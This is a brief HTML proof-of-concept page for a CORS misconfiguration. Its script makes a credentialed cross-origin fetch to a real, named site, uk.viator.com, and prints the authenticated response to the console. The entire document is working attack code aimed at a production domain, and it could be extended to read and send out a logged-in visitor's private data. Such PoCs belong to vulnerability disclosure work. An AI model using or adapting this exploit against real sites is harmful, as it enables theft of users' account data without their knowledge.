<!doctype html>
<html>
  <body>
    <h1>CORS Misconfiguration PoC</h1>
    <script>
      fetch('https://uk.viator.com', {
        method: 'GET',
        credentials: 'include'
      })
      .then(response => response.text())
      .then(data => {
        console.log('Response from uk.viator.com:', data);
        alert('Check the console for response!');
      })
      .catch(err => console.error('Error:', err));
    </script>
  </body>
</html>
